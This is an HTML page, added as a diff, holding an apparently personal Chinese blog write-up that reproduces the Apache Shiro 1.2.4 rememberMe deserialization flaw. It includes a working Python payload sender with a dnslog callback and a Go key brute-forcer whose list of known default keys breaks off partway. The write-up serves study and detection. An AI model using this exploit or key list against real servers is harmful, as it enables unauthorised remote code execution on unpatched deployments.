@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>shiro 漏洞复现 | ch4ser の 超元域</title>
+<meta name="keywords" content="">
+<meta name="description" content="
+记录shiro漏洞学习的过程, 参考https://saucer-man.com/information_security/396.html, 并在漏洞分析基础上编写检测脚本">
+<meta name="author" content="ch4ser">
+<link rel="canonical" href="http://localhost:1313/posts/sec-shiro-attack/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.d690e4a0ad08d48813d0c47209f8dc999c569e14cb01b287b5bfa2d3e05067ef.css" integrity="sha256-1pDkoK0I1IgT0MRyCfjcmZxWnhTLAbKHtb&#43;i0&#43;BQZ&#43;8=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/flash.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/flash.ico">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/flash.ico">
+<link rel="apple-touch-icon" href="http://localhost:1313/flash.ico">
+<link rel="mask-icon" href="http://localhost:1313/flash.ico">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/sec-shiro-attack/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="ch4ser の 超元域 (Alt + H)">
+                <img src="http://localhost:1313/avatar.jpg" alt="" aria-label="logo"
+                    height="35">ch4ser の 超元域</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/categories/" title="categories">
+                    <span>categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="about">
+                    <span>about</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      shiro 漏洞复现
+    </h1>
+    <div class="post-meta"><span title='2022-01-22 10:52:46 +0000 UTC'>January 22, 2022</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;713 words&nbsp;·&nbsp;ch4ser
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#环境搭建">环境搭建</a></li>
+    <li><a href="#漏洞调试">漏洞调试</a>
+      <ul>
+        <li><a href="#登陆过程">登陆过程</a></li>
+        <li><a href="#rememberme解密过程">rememberMe解密过程</a></li>
+      </ul>
+    </li>
+    <li><a href="#密钥爆破">密钥爆破</a></li>
+  </ul>
+</nav>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><blockquote>
+<p>记录shiro漏洞学习的过程, 参考https://saucer-man.com/information_security/396.html, 并在漏洞分析基础上编写检测脚本</p></blockquote>
+<h2 id="环境搭建">环境搭建<a hidden class="anchor" aria-hidden="true" href="#环境搭建">#</a></h2>
+<pre tabindex="0"><code>git clone https://github.com/apache/shiro.git
+cd shiro
+git checkout shiro-root-1.2.4 
+</code></pre><p>设置<code>shiro/samples/web/pom.xml</code>, 添加版本1.2</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>javax.servlet<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>jstl<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>1.2<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;scope&gt;</span>runtime<span class="nt">&lt;/scope&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
+</span></span></code></pre></div><p>为tomcat8文件添加权限</p>
+<pre tabindex="0"><code>sudo chmod -R 755 /var/lib/tomcat8
+sudo chmod -R 755 /etc/tomcat8
+</code></pre><p>使用idea打开<code>shiro/samples/web</code>项目, 等待maven项目依赖下载完成, 编辑配置</p>
+<p><img alt="image-20220122154253032" loading="lazy" src="/posts/sec-shiro-attack/image-20220122154253032.png"></p>
+<p>进入Deployment, 添加artifact</p>
+<p><img alt="image-20220122154335606" loading="lazy" src="/posts/sec-shiro-attack/image-20220122154335606.png"></p>
+<p>启动项目, 看到下面的页面就说明环境搭建完成了</p>
+<p><img alt="image-20220122154432029" loading="lazy" src="/posts/sec-shiro-attack/image-20220122154432029.png"></p>
+<h2 id="漏洞调试">漏洞调试<a hidden class="anchor" aria-hidden="true" href="#漏洞调试">#</a></h2>
+<h3 id="登陆过程">登陆过程<a hidden class="anchor" aria-hidden="true" href="#登陆过程">#</a></h3>
+<p>首先看登陆过程, 在<code>org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin</code>打下断点, 随后在浏览器中选中Remember Me选项进行登陆, 程序进入断点:</p>
+<p><img alt="image-20220122163548996" loading="lazy" src="/posts/sec-shiro-attack/image-20220122163548996.png"></p>
+<p>在<code>forgetIdentity</code>函数中, 会尝试获取request 和 response, 并移除之前的身份信息.</p>
+<p><img alt="image-20220122164355343" loading="lazy" src="/posts/sec-shiro-attack/image-20220122164355343.png"></p>
+<p>回到之前的函数, 进入第一个if分支, 进入<code>rememberIdentity</code>函数, <code>this.getIdentityToRemember</code>函数获取到身份信息, 然后调用<code>rememberIdentity</code>函数.</p>
+<p><img alt="image-20220122164841524" loading="lazy" src="/posts/sec-shiro-attack/image-20220122164841524.png"></p>
+<p><code>rememberIdentity</code>函数中, 首先将<code>accountPrincipals</code>转换成bytes</p>
+<p><img alt="image-20220122165211999" loading="lazy" src="/posts/sec-shiro-attack/image-20220122165211999.png"></p>
+<p>转换的逻辑为先进行序列化然后再进行加密, 如下</p>
+<p><img alt="image-20220122165440695" loading="lazy" src="/posts/sec-shiro-attack/image-20220122165440695.png"></p>
+<p>加密的方式为AES加密</p>
+<p><img alt="image-20220122170022825" loading="lazy" src="/posts/sec-shiro-attack/image-20220122170022825.png"></p>
+<p>跟进密钥获取的函数</p>
+<p><img alt="image-20220122170008256" loading="lazy" src="/posts/sec-shiro-attack/image-20220122170008256.png"></p>
+<p>从最后一行可以看到,在对象初始化的时候, 自动设置密钥为默认密钥</p>
+<p><img alt="image-20220122165857201" loading="lazy" src="/posts/sec-shiro-attack/image-20220122165857201.png"></p>
+<p>返回到<code>rememberIdentity</code>函数, 跟进<code>rememberSerializedIdentity</code>, 这里主要是将加密结果经过base64之后存储进cookie中</p>
+<p><img alt="image-20220122172439145" loading="lazy" src="/posts/sec-shiro-attack/image-20220122172439145.png"></p>
+<h3 id="rememberme解密过程">rememberMe解密过程<a hidden class="anchor" aria-hidden="true" href="#rememberme解密过程">#</a></h3>
+<p>在``org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity` 打下断点, 使用脚本向本地服务器发送payload</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">traceback</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;http://localhost:8000/web_war/&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">jar_file</span> <span class="o">=</span> <span class="s1">&#39;./ysoserial.jar&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">cipher_key</span> <span class="o">=</span> <span class="s2">&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">popen</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">([</span><span class="s1">&#39;java&#39;</span><span class="p">,</span><span class="s1">&#39;-jar&#39;</span><span class="p">,</span><span class="n">jar_file</span><span class="p">,</span> <span class="s2">&#34;URLDNS&#34;</span><span class="p">,</span> <span class="s2">&#34;http://ktclkl.dnslog.cn&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">                        <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">BS</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span>
+</span></span><span class="line"><span class="cl"><span class="n">pad</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="n">s</span> <span class="o">+</span> <span class="p">((</span><span class="n">BS</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">%</span> <span class="n">BS</span><span class="p">)</span> <span class="o">*</span> <span class="nb">chr</span><span class="p">(</span><span class="n">BS</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">%</span> <span class="n">BS</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">mode</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span>
+</span></span><span class="line"><span class="cl"><span class="n">iv</span> <span class="o">=</span> <span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">()</span><span class="o">.</span><span class="n">bytes</span>
+</span></span><span class="line"><span class="cl"><span class="n">encryptor</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">cipher_key</span><span class="p">),</span> <span class="n">mode</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">getget</span> <span class="o">=</span> <span class="n">popen</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">file_body</span> <span class="o">=</span> <span class="n">pad</span><span class="p">(</span><span class="n">getget</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">base64_ciphertext</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">iv</span> <span class="o">+</span> <span class="n">encryptor</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">file_body</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">base64_ciphertext</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;rememberMe&#39;</span><span class="p">:</span><span class="n">base64_ciphertext</span><span class="o">.</span><span class="n">decode</span><span class="p">()},</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">traceback</span><span class="o">.</span><span class="n">print_exc</span><span class="p">()</span>
+</span></span></code></pre></div><h5 id="image-20220122175423163"><img alt="image-20220122175423163" loading="lazy" src="/posts/sec-shiro-attack/image-20220122175423163.png"><a hidden class="anchor" aria-hidden="true" href="#image-20220122175423163">#</a></h5>
+<p>跟进函数, 发现<code>getRememberMeManager</code>会返回cookie的信息, 加密服务和加密解密用的密钥.</p>
+<p><img alt="image-20220122175833707" loading="lazy" src="/posts/sec-shiro-attack/image-20220122175833707.png"></p>
+<p>接下来, 跟进<code>getRememberedPrincipals</code>函数, 首先会尝试获取rememberMe中的序列化对象, 然后</p>
+<p><img alt="image-20220122180215754" loading="lazy" src="/posts/sec-shiro-attack/image-20220122180215754.png"></p>
+<p>看看<code>getRememberedSerializedIdentity</code>的内容, 主要环节就是获取cookie并进行bas64解密, 并将解密结果返回回去.</p>
+<p><img alt="image-20220122191255902" loading="lazy" src="/posts/sec-shiro-attack/image-20220122191255902.png"></p>
+<p>接下来进入 <code>convertBytesToPrincipals</code>函数, 可以看到这里进行了解密操作, 并且进行了反序列化操作. 解密操作和之前的加密操作类似,</p>
+<p><img alt="image-20220122192211652" loading="lazy" src="/posts/sec-shiro-attack/image-20220122192211652.png"></p>
+<p><img alt="image-20220122193026077" loading="lazy" src="/posts/sec-shiro-attack/image-20220122193026077.png"></p>
+<p>至此 , 反序列化漏洞触发. 总体来说这个漏洞跟起来并不复杂.</p>
+<h2 id="密钥爆破">密钥爆破<a hidden class="anchor" aria-hidden="true" href="#密钥爆破">#</a></h2>
+<p>这里参考https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ的方法编写自己的shiro检测脚本, 脚本中的密钥字典来源于https://github.com/pmiaowu/BurpShiroPassiveScan的代码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-golang" data-lang="golang"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nx">main</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;bytes&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;crypto/aes&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;crypto/cipher&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;encoding/base64&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;log&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;net/http&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;os&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;strings&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;time&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">func</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">args</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">os</span><span class="p">.</span><span class="nx">Args</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="nb">len</span><span class="p">(</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">&lt;</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;usage: ./shiro-brute-key {url}&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;\033[31mNo args specific, exit\033[0m&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">return</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="kd">var</span><span class="w"> </span><span class="nx">url</span><span class="w"> </span><span class="kt">string</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">args</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="c1">// start to detect shiro</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="nf">detectShiro</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">true</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;\033[31mSeems no shiro, exit\033[0m&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">return</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;\033[32mShiro detected!\033[0m&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;\033[34mStart bruting key......\033[0m&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="kd">var</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="kt">bool</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="kd">var</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="kt">string</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="nx">result</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nf">bruteKey</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span><span class="nx">result</span><span class="o">!=</span><span class="kc">true</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;\033[31mBrute failed!\033[0m&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">return</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;\033[33mBrute success!Key: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34; \033[0m&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">return</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">func</span><span class="w"> </span><span class="nf">detectShiro</span><span class="p">(</span><span class="nx">url</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="nx">result</span><span class="w"> </span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">client</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">http</span><span class="p">.</span><span class="nx">Client</span><span class="p">{</span><span class="nx">Timeout</span><span class="p">:</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">10</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">http</span><span class="p">.</span><span class="nf">NewRequest</span><span class="p">(</span><span class="s">&#34;GET&#34;</span><span class="p">,</span><span class="w"> </span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">req</span><span class="p">.</span><span class="nx">Header</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="s">&#34;Cookie&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;rememberMe=1&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">req</span><span class="p">.</span><span class="nx">Header</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="s">&#34;User-Agent&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">resp</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">client</span><span class="p">.</span><span class="nf">Do</span><span class="p">(</span><span class="nx">req</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Error with http request,please check your url&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">return</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">setCookies</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">resp</span><span class="p">.</span><span class="nf">Cookies</span><span class="p">()</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">for</span><span class="w"> </span><span class="nx">_</span><span class="p">,</span><span class="w"> </span><span class="nx">cookie</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="k">range</span><span class="w"> </span><span class="nx">setCookies</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">if</span><span class="w"> </span><span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">cookie</span><span class="p">.</span><span class="nf">String</span><span class="p">(),</span><span class="w"> </span><span class="s">&#34;rememberMe=deleteMe&#34;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Found return cookie: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">cookie</span><span class="p">.</span><span class="nf">String</span><span class="p">())</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">func</span><span class="w"> </span><span class="nf">bruteKey</span><span class="p">(</span><span class="nx">url</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="kt">bool</span><span class="p">,</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">key_dict</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="p">[</span><span class="o">...</span><span class="p">]</span><span class="kt">string</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Z3VucwAAAAAAAAAAAAAAAA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;wGiHplamyXlVB11UXWol8g==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;2AvVhdsgUs0FSA3SDFAdag==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;3AvVhmFLUs0KTA3Kprsdag==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;4AvVhmFLUs0KTA3Kprsdag==&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="s">&#34;bWljcm9zAAAAAAAAAAAAAA==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;WcfHGU25gNnTxTlmJMeSpw==&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;fCq+/xW488hMTCD+cmJ3aQ==&#34;</span><span class="p">,</span><span class="w">
